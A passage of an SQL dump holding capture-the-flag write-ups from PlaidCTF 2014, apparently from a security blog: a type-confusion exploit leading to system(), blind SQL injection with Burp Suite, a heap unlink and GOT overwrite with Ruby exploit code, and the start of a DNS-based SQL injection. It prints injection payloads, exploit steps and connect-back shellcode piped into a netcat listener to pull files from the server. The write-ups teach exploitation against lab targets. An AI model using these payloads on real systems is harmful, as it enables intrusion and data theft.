AAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n\r\nI\'m sure you\'ll love to show this new art to your friends!\r\n\r\nChoose an Option:\r\n1. Go into the Grass\r\n2. Heal your Pokemon\r\n3. Inpect your Pokemon\r\n4. Release a Pokemon\r\n5. Change Pokemon artwork\r\n\r\n3\r\nHere are all of the stats on your current Pokemon!\r\nName: Bird Jesus\r\n\r\n[...ascii art...]\r\n\r\nCurrent Health: 960\r\nAttack Power: 20\r\nAttack: Gust\r\nSegmentation fault (core dumped)\r\n\r\n$ gdb -q ./kappa-fixed ./core\r\nCore was generated by `./kappa-fixed\'.\r\nProgram terminated with signal 11, Segmentation fault.\r\n#0  0x41414141 in ?? ()\r\n(gdb)\r\n\nSure enough, we can control the call (and therefore EIP) by overwriting the function pointer!\nThe deep blue libc\nAll right, we have EIP control, but that was only half the time I spent on this level! The other half was trying to figure out what to do with libc. Basically, I can cause a crash here:\n\r\n.text:08049075                 mov     [esp], edx\r\n.text:08049078                 call    eax\r\n\nWhere \'edx\' is a pointer to the full structure—the name, etc.—and eax is fully controlled. That means we can call an arbitrary function and pass an arbitrary string value as the first parameter. system(), anyone?\nThe first thing we tried was jumping to the heap. Suffice to say, that failed. So we had to be more clever and use a return-into-libc attack. The problem was, we didn\'t know where libc was!\nRemember earlier when I said that actions was an important field? Well, the actions field, normally, is a pointer to the action that the Pokemon can take. Did you see under Bird Jesus\'s status where it said Attack: Gust? Well, that\'s reading a string pointed to by our struct. By using the same overflow we were using before, we can change where it reads that string from!\nTo put a kink in it, it\'s actually dereferenced before being read. Which means that whatever we point it to will be dereferenced then printed. So, it\'s a pointer to a string pointer. Meaning we can only read memory if we have a pointer to it!\nFor our attack, we need a pointer to libc. Luckily, we have the ever-handy Program Relocation Table sitting around, with calls such as this:\n\r\n.plt:08048510 _read           proc near               ; CODE XREF: sub_8048960+1DCp\r\n.plt:08048510                                         ; do_change_artwork+5A6p\r\n.plt:08048510                 jmp     ds:off_804AEB4\r\n.plt:08048510 _read           endp\r\n\nThe machine code for making that jump is actually FF 25 B8 AE 04 08. The last 4 bytes—B8 AE 04 08—refer to the address 0x0804aeb8. That address, in turn, stores the actual relocation address of the read() libc call! We chose read() because it happened to be the first one, and it just happened to be the one we grabbed. We could just of easily have used printf() or any other libc function.\nTo rephrase all that, we can set the Pokemon\'s action to a pointer to a string pointer. If we use 0x08048510+2, then we\'re setting it to a pointer to 0x804AEB4, which in turn is the read() libc call. Then when it tries to print, it\'s going to print the address of read() (and also printf() and some other functions) as a string, until it reaches a NUL byte!\nHere\'s what it looks like:\n\r\n...\r\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE\r\nCurrent Health: 69\r\nAttack Power: 9999\r\nAttack: P l\\xB7\\xB0\\xC3d\\xB7@Hg\\xB70\\x98g\\xB7 Df\\xB7f\\x85\r\nName: Kack2\r\n...\r\n\nRemember the series of \'A\'s is the altered artwork. And \"P l\\xb7\" works out to \"50 20 6c b7\", or \"0xb76c2050\", a perfectly reasonable pointer to a libc function!\nPwnage\nAll right, we\'re just about done! We have an offset for libc\'s read() function, but what about system()?\nThis is where we cheated a bit. And by cheated, I mean use a common CTF technique: We stole a copy of libc from ezhp\'s level!\nTo do this, I re-exploited ezhp, and used connect-back shellcode to netcat that I had running. The netcat was logging into a file using the \"tee\" program:\n\r\nnc -vv -l -p 55555 | tee libc.hex\r\n\nThen once I\'d exploited ezhp and gotten a shell back on that netcat instance, I used \'ldd\' on ezhp\'s binary to find libc:\n\r\nldd ezhp\r\n        linux-gate.so.1 =>  (0xb7759000)\r\n        libc.so.6 => /lib/i686/cmov/libc.so.6 (0xb7600000)\r\n        /lib/ld-linux.so.2 (0xb775a000)\r\n\nThen printed libc.so.6 out in hex:\n\r\nxxd -g1 /lib/i686/cmov/libc.so.6 | head\r\n0000000: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00  .ELF............\r\n0000010: 03 00 03 00 01 00 00 00 00 6e 01 00 34 00 00 00  .........n..4...\r\n0000020: fc 36 14 00 00 00 00 00 34 00 20 00 0a 00 28 00  .6......4. ...(.\r\n0000030: 45 00 44 00 06 00 00 00 34 00 00 00 34 00 00 00  E.D.....4...4...\r\n0000040: 34 00 00 00 40 01 00 00 40 01 00 00 05 00 00 00  4...@...@.......\r\n...\r\n\nThen terminated the connection.\nAt this point, I had a fairly dirty libc.hex file. I opened it up in vim, removed everything except the hexdump, and saved it. Then I converted it back to binary:\n\r\nxxd -r < libc.hex > libc.so.6\r\n\nAnd now I had a pretty typical libc.so copy from the server, and sure enough it was right! Once I had it, I calculated the offset between read() and system(), which turned out to be 0x8b500 bytes.\nI then used the following pseudo-code:\n\r\nreturn_address = read_address - 0x8b500\r\n\nto calculate the return address. I set the name of my Pokemon to the command I wanted to run (since the name is the first argument passed into the function). And I ran it!\nBecause the name of the Pokemon was limited to 15 characters, I ended up using the command ls -lR / to find the flag, which gave me a 2.8mb directory listing of the server:\n\r\n$ ls -lh dirlisting.txt\r\n-rw-r--r-- 1 ron ron 2.8M Apr 12 22:47 dirlisting.txt\r\n\nWhich turned out to be in /home/kappa/flag. Then, I printed it out using \"cat ~kappa/f*\".\nAnd that was it!\nConclusion\nSo basically, we could cause the program to mix up the structure types. We used that to create an arbitrary indirect read, which we used to find the read() function, and therefore the system() function. Armed with that, we used the structure mix up to overwrite a function pointer and call system() with arbitrary commands!', '\'Hacking\', \'PlaidCTF 2014\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwn-275-kappa-type-confusion-vuln');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (24, 'PlaidCTF writeup for Web-100 – PolygonShifter (blind sql injection)', 'Ron Bowes', '2014-4-17', 'Hey folks,\nI know in my last blog I promised to do a couple exploit ones instead of doing boring Web stuff. But, this level was really easy and I still wanted to do a writeup, so you\'re just going to have to wait a little while longer for my \'kappa\' writeup!\n\nThis 100-point Web challenge, called PolygonShifter, basically added some anti-bot defenses to a Web site by obfuscating the username/password field names, as well as the action for the POST request. When you visited the page, you\'d see something like this:\n\r\n<form action=\"/S1tl90gme2GJ67epbZz9\" method=\"POST\">\r\n    <label for=\"\" style=\"text-align:left;\">Username</label>\r\n    <input type=\"text\" id=\"lK1TFqrcp3fvIRSg8V7T\" name=\"L1UIVbxzFD8wUUo8SaJH\">\r\n    <label for=\"LkW7Ye9ItPb8CGeKZrMU\" style=\"text-align:left;\">Password</label>\r\n    <input type=\"password\" id=\"LkW7Ye9ItPb8CGeKZrMU\" name=\"LmmURBa3S5NRYBwzHXhC\">\r\n    <input class=\"primary large\" type=\"submit\" value=\"Login\">\r\n</form>\r\n\nI immediately installed the \'httparty\' gem and started writing a solution in ruby, when I had an inspiration. I tried using the same action multiple times, and it worked! It would only work for a few minutes before I had to refresh and get a new one. But, that was enough!\nI decided—incorrectly—that this was likely a brute-force level, so I fired up Burp Suite, chose \'Intruder\' mode, and set it to something like:\n\r\nPOST /im6Kh1pOKr7Y9bbDHiew HTTP/1.0\r\nHost: 54.204.80.192\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nProxy-Connection: keep-alive\r\nReferer: http://54.204.80.192/example\r\nCookie: resolution=1920; session=.eJxdzc0OwTAAAOBXkZ4dSkJC4kDaSYSOTruuF2nXonSz2GR-4t2JC_YAX74HUGnlTvlm66w3YPgALQ2GQMWwG3V31xQP5unByDCeOYr3hRTpCDzboFBlWZ_OpsFoRpSZBlLGsI4wqw3yjvEAccz-mfuapEMEQZNQI3-LkS8iQW5RzvtruPiYS2nPucpso7JHWoXBqrPwFGvEe5r7jN2JVIj9s5_KwCpZ-TEMp2RP2ZXqO1laQZ0Wyds8Xxv7V7E.Bix5uQ.vhQP7hI43dgozvUAVyBF7MM6C9E\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 56\r\n\r\nzDm8T52TDl5ymYfS3Yh5=admin&FcZtaYem0HE0t9bQQCTE=§password§\r\n\nThen I used Burp Suite\'s built-in list of passwords to attack the account.\nI let the attack run through the ~1000 or so passwords, then added a filter for \'Hello, \' (in order to find good attempts). There weren\'t any. Damnit, now I need a new plan!\n...then, on a random inspiration, I tried an invert search for \'Wrong password\'. And there was one entry: a password containing a single quote returned \"An error occurred\" instead of \"Wrong password\". *facepalm*, it\'s sql injection!\nSo, I tried logging in with:\n\nUsername :: admin\nPassword :: \' or 1=1-- \n\nAnd immediately, I\'m logged in... as \'test\'. Derp!\nSo I changed my credentials to:\n\nUsername :: admin\nPassword :: \' or username=\'admin\'-- \n\n(Don\'t forget to put a space after the \'--\' if you\'re following along!)\nAnd boom! I\'m logged in as \'admin\'! Finished, right? WRONG! The banner says: \"Hello, admin!! My password is the flag!\"\nNow, it sounds like I need to recover admin\'s password. CHALLENGE. ACCEPTED.\nI threw together a quick Burp Suite Intruder attack that looked like:\n\r\nPOST /im6Kh1pOKr7Y9bbDHiew HTTP/1.0\r\nHost: 54.204.80.192\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20100101 Firefox/17.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nProxy-Connection: keep-alive\r\nReferer: http://54.204.80.192/example\r\nCookie: resolution=1920; session=.eJxdzc0OwTAAAOBXkZ4dSkJC4kDaSYSOTruuF2nXonSz2GR-4t2JC_YAX74HUGnlTvlm66w3YPgALQ2GQMWwG3V31xQP5unByDCeOYr3hRTpCDzboFBlWZ_OpsFoRpSZBlLGsI4wqw3yjvEAccz-mfuapEMEQZNQI3-LkS8iQW5RzvtruPiYS2nPucpso7JHWoXBqrPwFGvEe5r7jN2JVIj9s5_KwCpZ-TEMp2RP2ZXqO1laQZ0Wyds8Xxv7V7E.Bix5uQ.vhQP7hI43dgozvUAVyBF7MM6C9E\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 53\r\n\r\nzDm8T52TDl5ymYfS3Yh5=admin&FcZtaYem0HE0t9bQQCTE=%27+or+%28username%3D%27admin%27+and+binary+substring%28password%2C+§1§%2C+1%29+%3D+%27§a§%27%29--+\r\n\nTo clean it up, it\'s basically:\n\nUsername :: admin\nPassword :: \' or (username=\'admin\' and binary substring(password, $1, 1) = \'$2\')\n\n(Where $1 and $2 are Burp Suite\'s marked fields)\nThen I set Burp Suite to use a \'Cluster Bomb\' style of attack, which means that each field has its own set of values that are tried. Then I set the two variables to:\n\n$1 :: numeric, 1 - 45 (I had to keep expanding this since the password was 30+ characters long!)\n$2 :: custom set, a-z A-Z 0-9 + symbols\n\nThen I let it run, filtered for \'Hello\', and got the following results:\n\nBoom! Arrange those properly and you have your password. :)', '\'Hacking\', \'PlaidCTF 2014\', \'Tools\'', 'https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-100-blind-sql-injection');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (25, 'PlaidCTF writeup for Pwn-200 (a simple overflow bug)', 'Ron Bowes', '2014-4-16', 'I know what you\'re thinking of: what\'s with all the Web levels!?\nWell, I was saving the exploitation levels for last! This post will be about Pwnable-200 (ezhp), and the next one will be Pwnable-275 (kappa). You can get the binary for ezhp here, and I highly recommend poking at this if you\'re interested in exploitation—it\'s actually one of the easiest exploitation levels you\'ll find!\n\nBasically, ezhp was a simple note-writing system. When you run it, it looks like this:\n\r\n./ezhp\r\nPlease enter one of the following:\r\n1 to add a note.\r\n2 to remove a note.\r\n3 to change a note.\r\n4 to print a note.\r\n5 to quit.\r\nPlease choose an option.\r\n1\r\nPlease give me a size.\r\n10\r\nPlease enter one of the following:\r\n1 to add a note.\r\n2 to remove a note.\r\n3 to change a note.\r\n4 to print a note.\r\n5 to quit.\r\n\nIn typical PPP fashion, it\'s a text-based app that is run using xinetd. I personally use \"nc -vv -l -p 4444 -e ./ezhp\" for testing, to make it run on localhost:4444.\nThe vulnerability\nAs usual, I started reversing from the easiest to the hardest. It\'s like a crossword puzzle, when you know the easy stuff, the hard stuff falls into place. My teammate insisted that we had to figure out the allocation code, but it was really confusing so I let him work on that. Meanwhile, I started looking at the change and print code.\nSomething I quickly notice is that the change option asks for a size:\n\r\nPlease enter one of the following:\r\n1 to add a note.\r\n2 to remove a note.\r\n3 to change a note.\r\n4 to print a note.\r\n5 to quit.\r\nPlease choose an option.\r\n3\r\nPlease give me an id.\r\n0\r\nPlease give me a size.\r\n10\r\nPlease input your data.\r\naaaa\r\nPlease enter one of the following:\r\n1 to add a note.\r\n2 to remove a note.\r\n3 to change a note.\r\n4 to print a note.\r\n5 to quit.\r\nPlease choose an option.\r\n\nBut in the code, it doesn\'t re-allocate with the size:\n\r\n.text:080488E7                 mov     dword ptr [esp], offset aPleaseGiveMeAS ; \"Please give me a size.\"\r\n.text:080488EE                 call    _puts\r\n.text:080488EE\r\n.text:080488F3                 mov     eax, ds:stdout\r\n.text:080488F8                 mov     [esp], eax      ; stream\r\n.text:080488FB                 call    _fflush\r\n.text:080488FB\r\n.text:08048900                 mov     eax, offset aDC ; \"%d%*c\"\r\n.text:08048905                 lea     edx, [ebp+entry_size] ; Nothing is stopping this from being negative\r\n.text:08048908                 mov     [esp+4], edx\r\n.text:0804890C                 mov     [esp], eax\r\n.text:0804890F                 call    ___isoc99_scanf\r\n.text:0804890F\r\n.text:08048914                 mov     dword ptr [esp], offset aPleaseInputYou ; \"Please input your data.\"\r\n.text:0804891B                 call    _puts\r\n.text:0804891B\r\n.text:08048920                 mov     eax, ds:stdout\r\n.text:08048925                 mov     [esp], eax      ; stream\r\n.text:08048928                 call    _fflush\r\n.text:08048928\r\n.text:0804892D                 mov     edx, [ebp+entry_size]\r\n.text:08048930                 mov     eax, [ebp+entry_id]\r\n.text:08048933                 mov     eax, ds:entry_list[eax*4]\r\n.text:0804893A                 mov     [esp+8], edx    ; nbytes\r\n.text:0804893E                 mov     [esp+4], eax    ; buf\r\n.text:08048942                 mov     dword ptr [esp], 0 ; fd\r\n.text:08048949                 call    _read\r\n\nCould it really be that easy? (Warning: this is going to be long, but I\'ll explain why I chose this series of actions right away)\n\r\nPlease enter one of the following:\r\n1 to add a note.\r\n2 to remove a note.\r\n3 to change a note.\r\n4 to print a note.\r\n5 to quit.\r\nPlease choose an option.\r\n1\r\nPlease give me a size.\r\n4\r\nPlease enter one of the following:\r\n1 to add a note.\r\n2 to remove a note.\r\n3 to change a note.\r\n4 to print a note.\r\n5 to quit.\r\nPlease choose an option.\r\n1\r\nPlease give me a size.\r\n3\r\nPlease enter one of the following:\r\n1 to add a note.\r\n2 to remove a note.\r\n3 to change a note.\r\n4 to print a note.\r\n5 to quit.\r\nPlease choose an option.\r\n3\r\nPlease give me an id.\r\n0\r\nPlease give me a size.\r\n20\r\nPlease input your data.\r\nAAAAAAAAAAAAAAAAAAAA\r\nPlease enter one of the following:\r\n1 to add a note.\r\n2 to remove a note.\r\n3 to change a note.\r\n4 to print a note.\r\n5 to quit.\r\nPlease choose an option.\r\n2\r\nPlease give me an id.\r\n1\r\nSegmentation fault (core dumped)\r\n\nThen using gdb to check out what happened:\n\r\n$ gdb -q ./ezhp ./core\r\nProgram terminated with signal 11, Segmentation fault.\r\n#0  0x0804874a in ?? ()\r\n(gdb) x/i $eip\r\n0x804874a:      mov    DWORD PTR [eax+0x8],edx\r\n(gdb) print/x $eax\r\n$2 = 0x41414141\r\n(gdb) x/5i $eip\r\n0x804874a:      mov    DWORD PTR [eax+0x8],edx\r\n0x804874d:      mov    eax,ds:0x804b060\r\n0x8048752:      mov    edx,DWORD PTR [eax+0x4]\r\n0x8048755:      mov    eax,DWORD PTR [ebp-0xc]\r\n0x8048758:      mov    DWORD PTR [eax+0x4],edx\r\n\nThis is exactly what I expected to see. Let me explain.\nHeap overflows\nSo, this isn\'t really a heap overflow. But it doesn\'t matter - it\'s a vulnerability that\'s effectively identical to a heap overflow, and involves a data structure that looks like this:\n\r\ntypedef struct {\r\n  void *previous;\r\n  void *next;\r\n  char data[0]; /* In C99+, this is an arbitrary-length array */\r\n\nFor a much more details/in-depth version of this vulnerability, check out my writeup for gitsmsg.\nWhat I did to test was:\n\nAllocate a small chunk of data\nAllocate a second small check of data, that most likely goes right after the first chunk\nWrite too many \'AAAA...\' values to the first chunk, so it overwrite\'s the second chunk\'s previous/next pointers\nAttempt to de-allocate the second chunk\n\nWhen you attempt to de-allocate the second chunk, it\'s going to try to replace the previous/next pointers. It usually looks something like:\n\r\nthis->prev->next = this->next;\r\nthis->next->prev = this->prev;\r\n\nSince this->prev and this->next are part of the data that was overwritten, they\'re going to be set to \'AAAA...\'. So, we expect a crash when it tries to write to this->prev->next, since it\'s going to try to dereference this->prev, or 0x41414141. And sure enough, it crashes accessing 0x41414141:\n\r\n(gdb) x/i $eip\r\n0x804874a:      mov    DWORD PTR [eax+0x8],edx\r\n(gdb) print/x $eax\r\n$2 = 0x41414141\r\n\nNote that it\'s writing to eax+0x8. We can surmise that eax+0x8 is either \'prev\' or \'next\'. Since this looks like unlinking code, we expect to see either eax+0x4 or eax+0xc written in the next couple lines. That\'s why when I saw this code:\n\r\n(gdb) x/5i $eip\r\n0x804874a:      mov    DWORD PTR [eax+0x8],edx\r\n0x804874d:      mov    eax,ds:0x804b060\r\n0x8048752:      mov    edx,DWORD PTR [eax+0x4]\r\n0x8048755:      mov    eax,DWORD PTR [ebp-0xc]\r\n0x8048758:      mov    DWORD PTR [eax+0x4],edx\r\n\nI knew exactly what I was looking at!\nTo summarize: they are allocating an array of data structures. Each structure comes after the previous, and contains previous/next pointers. By overwriting these pointers, we can cause an arbitrary address to be written with an arbitrary value. Sweet!\nExploit part 1: Leaking an address\nThis is the part where I always cross my fingers. Is executable memory being used? Or am I going to have to do something clever? Honestly, I didn\'t even figure out whether this was heap or .bss or whatever—I found this issue almost entirely by recognizing the exploit category. But I figured the easiest thing to do is just to try:\n\nCreate a long block containing shellcode\nCreate a short block\nWrite the shellcode to the long block, and just enough padding to get right up to the short block\'s \'previous\' pointer\nPrint out the first block\n\nHopefully this isn\'t too confusing. What we want is to figure out where in memory shellcode is stored. I didn\'t actually check if the address is randomized, but it doesn\'t matter—when I have the opportunity to read the address of shellcode in a reliable way, I always take it. Why not make the code ASLR-proof if it\'s not much extra work?\nThe code looks like this in my exploit:\n\r\n# These are used to store shellcode and get the address\r\nreader = add_note(SHELLCODE_SIZE - 16)\r\nread   = add_note(4)\r\n\r\nedit_note(reader, SHELLCODE_SIZE, SHELLCODE + (\"\\xcc\" * (SHELLCODE_SIZE - SHELLCODE.length)))\r\nresult = print_note(reader, SHELLCODE_SIZE + 8).unpack(\"I*\")\r\nSHELLCODE_ADDRESS = result[(SHELLCODE_SIZE / 4)] + 0x0c\r\n\nIn the end, that address wound up being slightly inaccurate. I ended up dealing with that using a NOP sled (ewwww) instead of troubleshooting. Maybe I should have tried to understand the allocation code after all? :)\nNow I have the address of my shellcode, what can I do with it!?\nExploit part 2: Controlling EIP\nThis is actually pretty easy once you understand part 1. Unlike gitsmsg (see the link above), RELRO wasn\'t enabled, which means I could edit the relocation table. The relocation table looks like:\n\r\n.got.plt:08049FF4 _got_plt        segment dword public \'DATA\' use32\r\n.got.plt:08049FF4                 assume cs:_got_plt\r\n.got.plt:08049FF4                 ;org 8049FF4h\r\n.got.plt:08049FF4                 align 10h\r\n.got.plt:0804A000 off_804A000     dd offset read          ; DATA XREF: _readr\r\n.got.plt:0804A004 off_804A004     dd offset fflush        ; DATA XREF: _fflushr\r\n.got.plt:0804A008 off_804A008     dd offset puts          ; DATA XREF: _putsr\r\n.got.plt:0804A00C off_804A00C     dd offset __gmon_start__ ; DATA XREF: ___gmon_start__r\r\n.got.plt:0804A010 off_804A010     dd offset exit          ; DATA XREF: _exitr\r\n.got.plt:0804A014 off_804A014     dd offset __libc_start_main\r\n.got.plt:0804A014                                         ; DATA XREF: ___libc_start_mainr\r\n.got.plt:0804A018 off_804A018     dd offset __isoc99_scanf ; DATA XREF: ___isoc99_scanfr\r\n.got.plt:0804A01C off_804A01C     dd offset sbrk          ; DATA XREF: _sbrkr\r\n.got.plt:0804A01C _got_plt        ends\r\n\nUltimately, it doesn\'t matter which one I overwrite, as long as it gets called at some point. So, I chose puts(). The exploit code is pretty simple:\n\r\n# These are used to overwrite arbitrary memory\r\nwriter = add_note(4)\r\nowned  = add_note(4)\r\n\r\n# Overwrite the second note\'s pointers, via the first\r\nedit_note(writer, 24, (\"A\" * 16) + [SHELLCODE_ADDRESS, PUTS_ADDRESS - 4].pack(\"II\"))\r\n\r\n# Removing it will trigger the overwrite\r\nremove_note(owned)\r\n\nBasically, we have 16 bytes of padding, then the address of the shellcode (the value we want to save) then the address of puts() in the relocation table (the place we want to save the shellcode address). Then we remove the note, which triggers the overwrite (and also a second overwrite, recall that unlinking changes both \'prev\' and \'next\'; it didn\'t affect me, but be careful with that). \nputs() immediately gets called, and the shellcode runs. I chose shellcode I found online, it\'s nothing special.\nHere\'s the full exploit\nConclusion\nOn one hand, I\'m proud that I found/exploited this level so quickly. I think I finished the whole thing in maybe 2 hours?\nOn the other hand, I never really understood why certain stuff worked and didn\'t work. For example, if my shellcode was too long it wouldn\'t work, and sometimes I couldn\'t read the address correctly. I also never really figured out the data structure, I completely used the debugger to get proper lengths.\nSo, it\'s kind of an ugly exploit. But it worked! Plus, we got 200 points for it, and in the end isn\'t that what matters?', '\'Hacking\', \'PlaidCTF 2014\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (26, 'PlaidCTF writeup for Web-300 – whatscat (SQL Injection via DNS)', 'Ron Bowes', '2014-4-16', 'Hey folks,\nThis is my writeup for Whatscat, just about the easiest 300-point Web level I\'ve ever solved! I wouldn\'t normally do a writeup about a level like this, but much like the mtpox level I actually wrote the exact tool for exploiting this, and even wrote a blog post about it almost exactly 4 years ago - April of 2010. Unlike mtpox, this tool isn\'t the least bit popular, but it sure made my life easy!\n\nThe set up\nWhatscat is a php application where people can post photos of cats and comment on them (Here\'s a copy of the source).\nThe vulnerable code is in the password-reset code, in login.php, which looks like this:\n\r\n  elseif (isset($_POST[\"reset\"])) {\r\n    $q = mysql_query(sprintf(\"select username,email,id from users where username=\'%s\'\",\r\n      mysql_real_escape_string($_POST[\"name\"])));\r\n    $res = mysql_fetch_object($q);\r\n    $pwnew = \"cat\".bin2hex(openssl_random_pseudo_bytes(8));\r\n    if ($res) {\r\n      echo sprintf(\"<p>Don\'t worry %s, we\'re emailing you a new password at %s</p>\",\r\n        $res->username,$res->email);\r\n      echo sprintf(\"<p>If you are not %s, we\'ll tell them something fishy is going on!</p>\",\r\n        $res->username);\r\n$message = <<<CAT\r\nHello. Either you or someone pretending to be you attempted to reset your password.\r\nAnyway, we set your new password to $pwnew\r\n\r\nIf it wasn\'t you who changed your password, we have logged their IP information as follows:\r\nCAT;\r\n      $details = gethostbyaddr($_SERVER[\'REMOTE_ADDR\']).\r\n        print_r(dns_get_record(gethostbyaddr($_SERVER[\'REMOTE_ADDR\'])),true);\r\n      mail($res->email,\"whatscat password reset\",$message.$details,\"From: whatscat@whatscat.cat\\r\\n\");\r\n      mysql_query(sprintf(\"update users set password=\'%s\', resetinfo=\'%s\' where username=\'%s\'\",\r\n              $pwnew,$details,$res->username));\r\n    }\r\n    else {\r\n      echo \"Hmm we don\'t seem to have anyone signed up by that name\";\r\n    }\r\n\nSpecifically, these lines:\n\r\n      $details = gethostbyaddr($_SERVER[\'REMOTE_ADDR\']).\r\n        print_r(dns_get_record(gethostbyaddr($_SERVER[\'REMOTE_ADDR\'])),true);\r\n      mail($res->email,\"whatscat password reset\",$message.$details,\"From: whatscat@whatscat.cat\\r\\n\");\r\n      mysql_query(sprintf(\"update users set password=\'%s\', resetinfo=\'%s\' where username=\'%s\'\",\r\n              $pwnew,$details,$res->username));\r\n\nThe $details variable is being inserted into the database unescaped. I\'ve noted in the past that people trust DNS results just a bit too much, and this is a great example of that mistake! If we can inject SQL code into a DNS request, we\'re set!\n...this is where I wasted a lot of time, because I didn\'t notice that the print_r() is actually part of the same statement as the line before it - I thought only the reverse DNS entry was being put into the database. As such, my friend Mak—who was working on this level first—tried to find a way to change the PTR record, and broke all kinds of SkullSpace infrastructure as a result.\nI ended up trying to log in as \'admin\'/\'password\', and, of course, failed. On a hunch, I hit \'forgot password\' for admin. That sent me to a Mailinator-like service. I logged into the mailbox, and noticed somebody trying to sql inject using TXT records. This wasn\'t an actual admin—like I thought it was—it was another player who just gave me a huge hint (hooray for disposable mail services!). Good fortune!\nKnowing that a TXT record would work, it actually came in handy that Mak controls the PTR records for all SkullSpace ip addresses. He could do something useful instead of breaking stuff! The server I use for blogs (/me waves) and such is on the SkullSpace network, so I got him to set the PTR record to test.skullseclabs.org. In fact, if you do a reverse lookup for \'206.220.196.59\' right now, you\'ll still see that:\n\r\n$ host blog.skullsecurity.org\r\nblog.skullsecurity.org is an alias for skullsecurity.org.\r\nskullsecurity.org has address 206.220.196.59\r\n$ host 206.220.196.59\r\n59.196.220.206.in-addr.arpa domain name pointer test.skullseclabs.org.\r\n\nI control the authoritative server for test.skullseclabs.org—that\'s why it exists—so I can make it say anything I want for any record. It\'s great fun! Though arguably overkill for this level, at least I didn\'t have to flip to my registrar\'s page every time I wanted to change a record; instead, I can do it quickly using a tool I wrote called dnsxss. Here\'s an example:\n\r\n$ sudo ./dnsxss --payload=\"Hello yes this is test\"\r\nListening for requests on 0.0.0.0:53\r\nWill response to queries with: Hello/yes/this/is/test\r\n\r\n$ dig -t txt test123.skullseclabs.org\r\n[...]\r\n;; ANSWER SECTION:\r\ntest123.skullseclabs.org. 1     IN      TXT     \"Hello yes this is test.test123.skullseclabs.org\"\r\n\nAll I had to do was find the right payload!\nThe exploit\nI\'m not a fan of working blind, so I made my own version of this service locally, and turned on SQL errors. Then I got to work constructing an exploit! It was an UPDATE statement, so I couldn\'t directly exploit this - I could only read indirectly by altering my email address (as you\'ll see). I also couldn\'t figure out how to properly terminate the sql string (neither \'#\' nor \'-- \' nor \';\' properly terminated due to brackets). In the end, my payload would:\n\nTack on an extra clause to the UPDATE that would set the \'email\' field to another value\nRead properly 